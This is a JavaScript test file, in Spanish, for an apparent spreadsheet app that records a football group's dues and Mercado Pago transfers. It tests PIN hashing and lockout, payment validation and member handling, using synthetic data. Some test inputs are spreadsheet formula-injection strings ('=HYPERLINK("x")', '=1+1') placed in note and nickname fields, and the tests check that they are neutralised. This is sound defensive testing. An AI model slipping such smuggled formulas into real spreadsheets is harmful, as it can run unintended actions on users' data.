    ['', ''], ['', ''], ['', ''], ['', ''], ['', ''], ['', ''],
    ['Saldo en caja ($)', 96000], ['Cuotas pagadas por adelantado ($)', 15000], ['Disponible para equipamiento ($)', 81000],
    ['', ''], ['', ''], ['Integrantes con deuda', 2], ['Deuda total, incluido el mes actual ($)', 30000],
  ]);
  const meses = [];
  for (let i = 0; i < 12; i++) meses.push({ value: art(`${2026 + Math.floor((9 + i) / 12)}-${String((9 + i) % 12 + 1).padStart(2, '0')}-01 00:00`), fmt: 'mmm yy' });
  const rows = [['Integrante', 'Pagado', 'Meses', 'A cuenta', 'Debe', 'Adelantado', 'Pagado hasta'].concat(meses)];
  apodos.forEach(a => rows.push([a, 0, 0, 0, 15000, 0, '-'].concat(Array(12).fill(''))));
  rows.push(['Totales', 0, '', '', 0, 0, '']);
  rows.push(['', '', '', '', '', '', 'Pagaron', 0]);
  const c = w.addSheet('Cuotas', rows);
  // una fórmula por fila de integrante, para verificar que se copia a la fila nueva
  apodos.forEach((a, i) => c.getRange(i + 2, 3).setValue('=INT(R[0]C[-1]/15000)'));
  w.sheet('Config').getRange('B7').setValue('luciopepi');
  w.sheet('Config').getRange('B28').setValue(art('2026-10-01 00:00'));
}
const APODOS = ['Juancho', 'Flaco', 'Tano', 'Colo', 'Dieguito'];
function uiPin(pin) {
  return {
    ButtonSet: { OK_CANCEL: 'OK_CANCEL' }, Button: { OK: 'OK' }, alerts: [],
    prompt() { return { getSelectedButton: () => 'OK', getResponseText: () => pin }; },
    alert(t) { this.alerts.push(t); },
  };
}
function intentar(fn) { try { return { r: fn() }; } catch (e) { return { e }; } }
const PIN = '482915';

section('A1 PIN del administrador');
{
  const ui = uiPin(PIN);
  const w = newWorld(basePayments(), { ui });
  addAppSheets(w, APODOS);
  let x = intentar(() => w.ctx.adminEntrar(PIN));
  check('sin PIN definido: pide definirlo', x.e && /Todavía no hay PIN/.test(x.e.message), x.e && x.e.message);
  w.run('definirPin');
  check('PIN guardado como hash con sal', /^[0-9a-f-]{36}:[A-Za-z0-9+/=]{44}$/.test(w.scriptProps.ADMIN_PIN || '') && !String(w.scriptProps.ADMIN_PIN).includes(PIN), w.scriptProps.ADMIN_PIN);
  x = intentar(() => w.ctx.adminEntrar(PIN));
  check('PIN correcto entra y devuelve integrantes', !x.e && x.r.integrantes.length === 5 && x.r.cuota === 15000, x.e && x.e.message);
  for (let i = 0; i < 5; i++) x = intentar(() => w.ctx.adminEntrar('000000'));
  check('PIN incorrecto', x.e && /PIN incorrecto/.test(x.e.message), x.e && x.e.message);
  x = intentar(() => w.ctx.adminEntrar(PIN));
  check('después de 5 errores bloquea aunque el PIN sea correcto', x.e && /Demasiados intentos/.test(x.e.message), x.e && x.e.message);
  x = intentar(() => w.ctx.adminCargarPago(PIN, { apodo: 'Colo', monto: 15000, fecha: '2026-10-10', imputacion: 'Cuota', medio: 'Efectivo' }));
  check('el bloqueo también frena las escrituras', x.e && /Demasiados intentos/.test(x.e.message));
  const ui2 = uiPin('12a');
  const w2 = newWorld(basePayments(), { ui: ui2 });
  w2.run('definirPin');
  check('PIN con letras no se guarda', !w2.scriptProps.ADMIN_PIN && /6 a 12 números/.test(ui2.alerts.join(' ')));
}

section('A2 cargar pago en efectivo');
{
  const w = newWorld(basePayments(), { ui: uiPin(PIN) });
  addAppSheets(w, APODOS);
  w.run('definirPin');
  w.setNow(nowIso('2026-10-10 20:00'));
  const antes = rowsOf(w, 'Pagos').length;
  let x = intentar(() => w.ctx.adminCargarPago(PIN, { apodo: 'Colo', monto: '15000', fecha: '2026-10-10', imputacion: 'Cuota', medio: 'Efectivo', nota: '=HYPERLINK("x")' }));
  check('carga sin error', !x.e, x.e && x.e.stack);
  const filas = rowsOf(w, 'Pagos');
  const ult = filas[filas.length - 1] || [];
  check('agrega una fila en Pagos', filas.length === antes + 1, filas.length);
  check('fila con integrante, monto, imputación y medio', /^10\/10\/2026( 00:00:00)?$/.test(ult[0]) && ult[1] === 'Colo' && ult[2] === '15000' && ult[3] === 'Cuota' && ult[4] === 'Efectivo', JSON.stringify(ult));
  check('nota marcada como cargada desde la app y sin fórmula', /^Cargado desde la app\. =HYPERLINK/.test(ult[9]) && w.formulas.filter(f => !/^Cuotas!/.test(f)).length === 0, ult[9] + ' | ' + w.formulas.join(','));
  check('queda en azul (cargado a mano)', w.sheet('Pagos').raw(antes + 2, 2).color === '#0000FF');
  check('devuelve mensaje y datos de la app', x.r && /Colo/.test(x.r.mensaje) && x.r.datos && x.r.datos.cancha && x.r.admin);
  x = intentar(() => w.ctx.adminCargarPago(PIN, { apodo: 'Colo', monto: '15000', fecha: '2026-10-10', imputacion: 'Cuota', medio: 'Efectivo' }));
  check('doble toque: no carga dos veces', x.e && /ya se cargó/.test(x.e.message) && rowsOf(w, 'Pagos').length === antes + 1);
  const malos = [
    [{ apodo: 'Nadie', monto: 15000, fecha: '2026-10-10', imputacion: 'Cuota', medio: 'Efectivo' }, /integrante/],
    [{ apodo: 'Tano', monto: 0, fecha: '2026-10-10', imputacion: 'Cuota', medio: 'Efectivo' }, /monto/],
    [{ apodo: 'Tano', monto: 15000, fecha: '2026-10-12', imputacion: 'Cuota', medio: 'Efectivo' }, /fecha/],
    [{ apodo: 'Tano', monto: 15000, fecha: '2026-02-31', imputacion: 'Cuota', medio: 'Efectivo' }, /fecha/],
    [{ apodo: 'Tano', monto: 15000, fecha: '2026-10-09', imputacion: 'Revisar', medio: 'Efectivo' }, /imputación/],
    [{ apodo: 'Tano', monto: 15000, fecha: '2026-10-09', imputacion: 'Cuota', medio: 'Cheque' }, /medio/],
  ];
  const fallan = malos.every(([d, re]) => { const y = intentar(() => w.ctx.adminCargarPago(PIN, d)); return y.e && re.test(y.e.message); });
  check('valida integrante, monto, fecha, imputación y medio', fallan && rowsOf(w, 'Pagos').length === antes + 1);
  x = intentar(() => w.ctx.adminCargarPago('999999', { apodo: 'Tano', monto: 15000, fecha: '2026-10-09', imputacion: 'Cuota', medio: 'Efectivo' }));
  check('sin PIN correcto no escribe', x.e && /PIN incorrecto/.test(x.e.message) && rowsOf(w, 'Pagos').length === antes + 1);
}

section('A3 asignar transferencias de Por revisar');
{
  const RICARDO = 444000555;
  const w = newWorld(basePayments().concat([
    pay({ id: 7101, created: '2026-10-10 10:00', payerId: RICARDO, cuit: '20111222333', amount: 15000, first: 'Ricardo', last: 'Pereyra' }),
    pay({ id: 7102, created: '2026-10-10 11:00', payerId: RICARDO, cuit: '20111222333', amount: 30000, first: 'Ricardo', last: 'Pereyra' }),
    pay({ id: 7103, created: '2026-10-10 12:00', payerId: ME, amount: 15000, ptype: 'bank_transfer', pmethod: 'cvu', bankName: 'Fulano Banco' }),
  ]), { ui: uiPin(PIN) });
  addAppSheets(w, APODOS);
  w.run('definirPin');
  let err = sync(w, '2026-10-10 15:00');
  check('sync sin error', !err, err && err.stack);
  check('quedan 3 en Por revisar', revisar(w).length === 3, JSON.stringify(revisar(w)));
  let x = intentar(() => w.ctx.adminEntrar(PIN));
  check('el panel lista las 3 sin CUIT ni ID', !x.e && x.r.porRevisar.length === 3 && !JSON.stringify(x.r).includes('20111222333') && !JSON.stringify(x.r).includes(String(RICARDO)), x.e ? x.e.message : JSON.stringify(x.r && x.r.porRevisar));
  x = intentar(() => w.ctx.adminAsignar(PIN, '7101', 'Colo'));
  check('asigna sin error', !x.e, x.e && x.e.stack);
  const p = rowsOf(w, 'Pagos');
  const deColo = p.filter(r => r[1] === 'Colo' && (r[8] === '7101' || r[8] === '7102'));
  check('pasa las 2 transferencias de esa cuenta a Pagos', deColo.length === 2, JSON.stringify(deColo));
  check('la de $30.000 queda como Cuota (múltiplo)', deColo.some(r => r[8] === '7102' && r[3] === 'Cuota'));
  check('se borran de Por revisar; queda la del banco', revisar(w).length === 1 && revisar(w)[0][7] === '7103', JSON.stringify(revisar(w)));
  const colo = w.sheet('Integrantes').rows(2).find(r => r[1] === 'Colo');
  check('guarda CUIT e ID de Mercado Pago en Integrantes', colo[5] === '20111222333' && colo[9] === String(RICARDO), JSON.stringify(colo));
  check('mensaje avisa que los próximos se cargan solos', /se cargan solos/.test(x.r.mensaje), x.r && x.r.mensaje);
  // la próxima transferencia de esa cuenta entra sola
  w.payments.push(pay({ id: 7104, created: '2026-10-11 09:00', payerId: RICARDO, cuit: '20111222333', amount: 15000, first: 'Ricardo', last: 'Pereyra' }));
  err = sync(w, '2026-10-11 10:00');
  check('la siguiente transferencia de Ricardo se carga sola a Colo', !err && rowsOf(w, 'Pagos').some(r => r[8] === '7104' && r[1] === 'Colo'), err && err.stack);
  // transferencia de banco: se asigna pero no aprende nada
  x = intentar(() => w.ctx.adminAsignar(PIN, '7103', 'Tano'));
  check('banco: se asigna y avisa que las próximas también van a Por revisar', !x.e && rowsOf(w, 'Pagos').some(r => r[8] === '7103' && r[1] === 'Tano' && r[4] === 'Transferencia bancaria') && /bancos/.test(x.r.mensaje), x.e ? x.e.message : x.r.mensaje);
  check('Por revisar queda vacío', revisar(w).length === 0);
  x = intentar(() => w.ctx.adminAsignar(PIN, '7103', 'Tano'));
  check('asignar una que ya no está da error claro', x.e && /ya no está/.test(x.e.message));
  check('no se crearon fórmulas', w.formulas.filter(f => !/^Cuotas!/.test(f)).length === 0, w.formulas.join(' | '));
}

section('A4 un CUIT que ya es de otro integrante no se pisa');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 7201, created: '2026-10-10 10:00', payerId: 444000777, cuit: '27999888777', amount: 15000, first: 'Esposa', last: 'De Tano' }),
  ]), { ui: uiPin(PIN) });
  addAppSheets(w, APODOS);
  w.run('definirPin');
  w.sheet('Integrantes').getRange('F5').setValue('27999888777, 20999000111'); // Colo: dos cuentas
  let err = sync(w, '2026-10-10 15:00');
  check('varios CUIT en una celda: reconoce el segundo', !err && rowsOf(w, 'Pagos').some(r => r[8] === '7201' && r[1] === 'Colo'), err ? err.stack : JSON.stringify(revisar(w)));
  w.payments.push(pay({ id: 7202, created: '2026-10-10 16:00', payerId: 444000888, cuit: '20999000111', amount: 15000 }));
  w.payments.push(pay({ id: 7203, created: '2026-10-10 16:30', payerId: 444000999, cuit: '27000111222', amount: 15000 }));
  w.sheet('Integrantes').getRange('F5').setValue('27999888777');
  err = sync(w, '2026-10-10 17:00');
  w.sheet('Integrantes').getRange('F4').setValue('27000111222'); // Tano ya tiene ese CUIT
  const x = intentar(() => w.ctx.adminAsignar(PIN, '7203', 'Juancho'));
  const juancho = w.sheet('Integrantes').rows(2).find(r => r[1] === 'Juancho');
  check('asigna, pero no le copia a Juancho un CUIT que es de Tano', !x.e && rowsOf(w, 'Pagos').some(r => r[8] === '7203' && r[1] === 'Juancho') && !String(juancho[5]).includes('27000111222'), x.e ? x.e.message : JSON.stringify(juancho));
}

section('A5 agregar integrante');
{
  const w = newWorld(basePayments(), { ui: uiPin(PIN) });
  addAppSheets(w, APODOS);
  w.run('definirPin');
  let x = intentar(() => w.ctx.adminAgregarIntegrante(PIN, { apodo: 'Nico', nombre: 'Nicolás', apellido: 'Paz', cuit: '20-33444555-6' }));
  check('agrega sin error', !x.e, x.e && x.e.stack);
  const ints = w.sheet('Integrantes').rows(2);
  const nico = ints[ints.length - 1];
  check('nueva fila al final de Integrantes', nico[1] === 'Nico' && nico[2] === 'Nicolás' && nico[5] === '20334445556' && nico[8] === 'No', JSON.stringify(nico));
  const cuo = w.sheet('Cuotas');
  check('Cuotas: fila nueva antes de Totales', cuo.display(8, 1) === 'Totales' && cuo.raw(7, 3).formula === '=INT(R[0]C[-1]/15000)', cuo.display(8, 1) + ' | ' + JSON.stringify(cuo.raw(7, 3)));
  check('mensaje dice que se carga solo con CUIT', /se van a cargar solas/.test(x.r.mensaje));
  const malos = [
    [{ apodo: 'nico' }, /Ya hay/],
    [{ apodo: 'Totales' }, /Ya hay/],
    [{ apodo: '=1+1' }, /apodo/],
    [{ apodo: 'Pepe', cuit: '123' }, /11 números/],
    [{ apodo: 'Pepe', cuit: '20334445556' }, /Nico/],
  ];
  check('valida apodo repetido, inválido y CUIT', malos.every(([d, re]) => { const y = intentar(() => w.ctx.adminAgregarIntegrante(PIN, d)); return y.e && re.test(y.e.message); }));
  w.sheet('Integrantes').getRange('B9').setValue('Suelto');
  x = intentar(() => w.ctx.adminAgregarIntegrante(PIN, { apodo: 'Otro' }));
  check('si Cuotas e Integrantes no están alineadas, no toca nada', x.e && /alineadas/.test(x.e.message) && w.sheet('Cuotas').display(8, 1) === 'Totales');
}

section('A6 funciones del menú no se pueden usar desde la app');
{
  const w = newWorld(basePayments());
  w.triggers.push({ h: 'sincronizar' });
  const intentos = ['desactivarSincronizacion', 'activarSincronizacion', 'sincronizarAhora', 'probarConexion', 'definirPin', 'guardarClave']
    .map(f => intentar(() => w.ctx[f]()));
  check('sin la planilla abierta, todas cortan', intentos.every(x => x.e && /getUi/.test(x.e.message)), intentos.map(x => x.e && x.e.message).join(' | '));
  check('el disparador sigue activo', w.triggers.length === 1);
}

// ------------------------------------------------------------ summary
const fails = results.filter(r => !r.ok);
console.log('\n================ SUMMARY ================');
console.log(`checks: ${results.length}, pass: ${results.length - fails.length}, fail: ${fails.length}`);
fails.forEach(f => console.log(`FAIL [${f.scenario}] ${f.label}${f.detail ? '\n      ' + String(f.detail).split('\n')[0] : ''}`));
